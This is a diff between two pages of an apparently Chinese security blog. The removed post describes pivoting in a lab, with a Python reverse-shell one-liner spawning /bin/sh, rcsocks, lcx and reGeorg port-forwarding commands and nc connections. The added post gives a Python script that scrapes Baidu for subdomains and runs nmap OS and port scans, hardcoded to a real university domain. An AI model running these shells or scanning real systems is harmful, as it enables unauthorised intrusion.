@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="内网渗透," />
+  <meta name="keywords" content="工具," />
 
 
 
@@ -105,23 +105,18 @@
 
 
 
-<meta name="description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
-<meta name="keywords" content="内网渗透">
+<meta name="description" content="闲的蛋疼的时候写点脚本，帮助测试把，说白了还是懒">
+<meta name="keywords" content="工具">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网穿透随想">
-<meta property="og:url" content="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/index.html">
+<meta property="og:title" content="脚本工具集">
+<meta property="og:url" content="http://whc.dropsec.xyz/2018/04/27/脚本工具集/index.html">
 <meta property="og:site_name" content="Ha1g0的窝">
-<meta property="og:description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
+<meta property="og:description" content="闲的蛋疼的时候写点脚本，帮助测试把，说白了还是懒">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
-<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png">
-<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/reGeorg.png">
-<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png">
-<meta property="og:updated_time" content="2017-12-12T10:48:57.008Z">
+<meta property="og:updated_time" content="2018-04-27T08:32:08.468Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网穿透随想">
-<meta name="twitter:description" content="整理整理最近碰到关于内网穿透（渗透）的一些基础知识 内网渗透随想  上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali 上，现在需要Centos7做中转。我在Centos上做端口转发 cd /src./rcsocks -l 1088 -p 1080 -">
-<meta name="twitter:image" content="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png">
+<meta name="twitter:title" content="脚本工具集">
+<meta name="twitter:description" content="闲的蛋疼的时候写点脚本，帮助测试把，说白了还是懒">
 
 
 
@@ -149,13 +144,13 @@
 
 
 
-  <link rel="canonical" href="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/"/>
+  <link rel="canonical" href="http://whc.dropsec.xyz/2018/04/27/脚本工具集/"/>
 
 
 
 
 
-  <title> 内网穿透随想 | Ha1g0的窝 </title>
+  <title> 脚本工具集 | Ha1g0的窝 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -294,7 +289,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/12/12/内网穿透随想/">
+    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2018/04/27/脚本工具集/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ha1g0">
@@ -315,7 +310,7 @@
             
             
               
-                内网穿透随想
+                脚本工具集
               
             
           </h1>
@@ -330,8 +325,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-12T15:56:57+08:00">
-                2017-12-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-27T16:28:37+08:00">
+                2018-04-27
               </time>
             
 
@@ -353,8 +348,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
+                  <a href="/categories/工具/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
                   </a>
                 </span>
 
@@ -388,41 +383,9 @@
       
 
       
-        <p>整理整理最近碰到关于内网穿透（渗透）的一些基础知识</p>
-<h3 id="内网渗透随想"><a href="#内网渗透随想" class="headerlink" title="内网渗透随想"></a>内网渗透随想</h3><hr>
-<p><img src="http://oohnuejim.bkt.clouddn.com/%E6%A8%A1%E6%8B%9F.png" alt="模拟"></p>
-<p>上图是我自己布置模拟环境，可以从拓扑上清晰地看出内网的ip段是192.168.1.0/24，模拟的外<br>段是192.168.80.0/24，现在我要把内网Ubuntu的机子的shell反弹到外网Kali</p>
-<p>上，现在需要Centos7做中转。<br>我在Centos上做端口转发</p>
-<p><code>cd /src</code><br><code>./rcsocks -l 1088 -p 1080 -vv</code></p>
-<p>现在我将Ubuntu上执行Python的反弹shell（反弹shell命令很多，请自行搜索），</p>
-<a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.1&quot;,1089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
-<p>然后kali正向连接Centos就行了</p>
-<p><code>nc 192.168.80.129 1080</code><br>或者<br><code>./rssocks -vv -s 192.168.80.129:1080</code></p>
-<p><img src="http://oohnuejim.bkt.clouddn.com/%E8%A5%BF%E6%99%AE%E5%B8%82%E8%B5%9B.png" alt="西普市赛"></p>
-<p>这个环境是我上次市赛碰到的环境，当时没有在ssocks本地编译，所以用了另一个代理工具reGeorg<br>附上链接<a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-12514-1-1.html</a><br>用法跟ssocks有点区别，<br><img src="http://oohnuejim.bkt.clouddn.com/reGeorg.png" alt="reGeorg"><br>这个需要在双网卡服务器的web服务上放置一个tunnel脚本，比如php的就放置tunnel.nosocket.php，然后在本机执行正向连接到tunnel脚本的命令</p>
-<p>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</p>
-<h3 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h3><hr>
-<p>再来简单地介绍介绍几个端口转发工具<br>适合自己的才是最好的</p>
-<ul>
-<li>lcx.exe （最容易被杀软干）</li>
-</ul>
-<p>反弹shell<br>攻击机<br><code>lcx.exe -listen 51 33891 把51的流量转发到33891上</code></p>
-<p>代理服务器（靶机）  </p>
-<p><code>lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389</code><br>把本机3389转发到攻击机的51端口上</p>
-<p>攻击机只需远程桌面连接 127.0.0.1:33891就能连接到靶机的3389了</p>
-<p><img src="http://oohnuejim.bkt.clouddn.com/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.png" alt="远程桌面"></p>
-<ul>
-<li>Reduh、reGeorg、Tunna</li>
-</ul>
-<p>用法都差不多，大同小异<br>具体看<br><a href="https://bbs.ichunqiu.com/thread-12514-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-12514-1-1.html</a><br><a href="https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg" target="_blank" rel="external">https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg</a></p>
-<p>具体介绍一个reGeorg，比如说PHP的环境，就把tunnel.nosocket.php放在一个web目录下，然后<br>python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)</p>
-<p>windows 用proxifier对转发端口进行全局代理<br>linux 用proxychain</p>
-<ul>
-<li>ssocks</li>
-</ul>
-<p>这个工具在linux用的比较多<br>一些基础用法 在上面的演示中也讲到了，具体看<br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/12182.html</a></p>
-
+        <p>闲的蛋疼的时候写点脚本，帮助测试把，说白了还是懒<br><a id="more"></a></p>
+<h2 id="00x1-信息搜集"><a href="#00x1-信息搜集" class="headerlink" title="00x1 信息搜集"></a>00x1 信息搜集</h2><p>这个需要本地配置下nmap</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Time    : 2018/4/16 13:28</span></div><div class="line"><span class="comment"># @Author  : ha1g0</span></div><div class="line"><span class="comment"># @Site    : http://whc.dropsec.xyz</span></div><div class="line"><span class="comment"># @File    : gathering.py</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> argparse </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> nmap</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 爬取单个百度搜索页面的域名</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw</span><span class="params">(url)</span>:</span></div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"</span>&#125;</div><div class="line">    response = requests.get(url, headers=header)</div><div class="line">    response_html = response.text</div><div class="line">    response_html.replace(<span class="string">'\xa0'</span>,<span class="string">''</span>)</div><div class="line">    <span class="comment"># 正则</span></div><div class="line">    match = <span class="string">'style="text-decoration:none;"&gt;(.*?)/'</span></div><div class="line">    subdomains = re.findall(match, response_html)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> subdomains:</div><div class="line">        i.strip(<span class="string">'&amp;nbsp'</span>)</div><div class="line">    <span class="keyword">return</span> subdomains</div><div class="line"></div><div class="line"><span class="comment"># 爬取前10页百度链接的二级域名</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_all</span><span class="params">(key,domains)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        url = <span class="string">"http://www.baidu.com/s?wd=site:"</span> + str(key) + <span class="string">"&amp;cl=3&amp;pn=%s"</span> % (i*<span class="number">10</span>)</div><div class="line">        subdomains=[]</div><div class="line">        subdomains = craw(url)</div><div class="line">        domains.extend(subdomains)</div><div class="line">        <span class="comment"># set去重</span></div><div class="line">        domains = list(set(domains))</div><div class="line">    <span class="keyword">return</span> domains</div><div class="line"></div><div class="line"> </div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">hostScan</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line"><span class="string">    根据ip对主机进行 端口 和 os的探测</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,ip)</span>:</span></div><div class="line">        self.ip = ip</div><div class="line">        self.ports = []</div><div class="line">        self.osname =<span class="string">''</span></div><div class="line">        self.accuracy = <span class="string">''</span></div><div class="line"></div><div class="line">        self.nm = nmap.PortScanner()</div><div class="line">        self.__ip_scan()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span>  <span class="title">__ip_scan</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            self.nm.scan(self.ip, arguments=<span class="string">"-O"</span>)</div><div class="line">            print(<span class="string">"调用 %s "</span> % (self.nm.command_line()))</div><div class="line">        <span class="keyword">except</span> nmap.PortScannerError:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_ports</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            self.ports = self.nm[self.ip].all_tcp()</div><div class="line">            <span class="keyword">return</span> self.ports</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            print(<span class="string">"主机%s不存活 "</span> % self.ip)</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_os</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            self.osname = self.nm[self.ip][<span class="string">"osmatch"</span>][<span class="number">0</span>][<span class="string">'name'</span>]</div><div class="line">            self.accuracy = self.nm[self.ip][<span class="string">"osmatch"</span>][<span class="number">0</span>][<span class="string">"accuracy"</span>]</div><div class="line">            <span class="keyword">return</span> self.osname</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> self.osname == <span class="string">''</span>:</div><div class="line">                self.osname = self.accuracy</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_info</span><span class="params">(self)</span>:</span></div><div class="line">        self.ip_ports()</div><div class="line">        self.ip_os()</div><div class="line">        <span class="keyword">return</span> self.ports,self.osname</div><div class="line"></div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(information)</span>:</span></div><div class="line">    ip = information[<span class="string">'ip'</span>]</div><div class="line">    scan = hostScan(ip)</div><div class="line">    ports, osname = scan.ip_info()</div><div class="line">    information[<span class="string">'ports'</span>] = ports</div><div class="line">    information[<span class="string">'osname'</span>] = osname</div><div class="line">    </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	subdomains = []</div><div class="line"></div><div class="line">	<span class="comment"># parser = argparse.ArgumentParser()</span></div><div class="line">	<span class="comment"># parser.add_argument('-d','--domain',help='first domain')</span></div><div class="line">	<span class="comment"># key = parser.parse_args().domain</span></div><div class="line">	key =<span class="string">'zzti.edu.cn'</span></div><div class="line">	<span class="keyword">if</span> key:</div><div class="line">		subdomains = craw_all(str(key),subdomains)</div><div class="line">		<span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</div><div class="line">			information = &#123;&#125;</div><div class="line">			ports=[]</div><div class="line">			osname =<span class="string">''</span></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				ip =  socket.gethostbyname(subdomain)</div><div class="line">				information[<span class="string">'subdomain'</span>] = subdomain</div><div class="line">				information[<span class="string">'ip'</span>] = ip</div><div class="line">				scan(information)</div><div class="line">			<span class="keyword">except</span> socket.gaierror <span class="keyword">as</span> e:</div><div class="line">				<span class="keyword">print</span> (<span class="string">'can\'t discover the ip of '</span>+str(subdomain))</div><div class="line">			<span class="keyword">print</span> (information)</div></pre></td></tr></table></figure>
       
     </div>
 
@@ -472,7 +435,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
           
         </div>
       
@@ -485,8 +448,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/12/01/SQL注入进阶思考/" rel="next" title="SQL注入进阶">
-                <i class="fa fa-chevron-left"></i> SQL注入进阶
+              <a href="/2017/12/12/内网穿透随想/" rel="next" title="内网穿透随想">
+                <i class="fa fa-chevron-left"></i> 内网穿透随想
               </a>
             
           </div>
@@ -494,10 +457,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/27/脚本工具集/" rel="prev" title="脚本工具集">
-                脚本工具集 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -667,7 +626,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网渗透随想"><span class="nav-number">1.</span> <span class="nav-text">内网渗透随想</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发工具"><span class="nav-number">2.</span> <span class="nav-text">端口转发工具</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#00x1-信息搜集"><span class="nav-number">1.</span> <span class="nav-text">00x1 信息搜集</span></a></li></ol></div>
             
 
           </div>
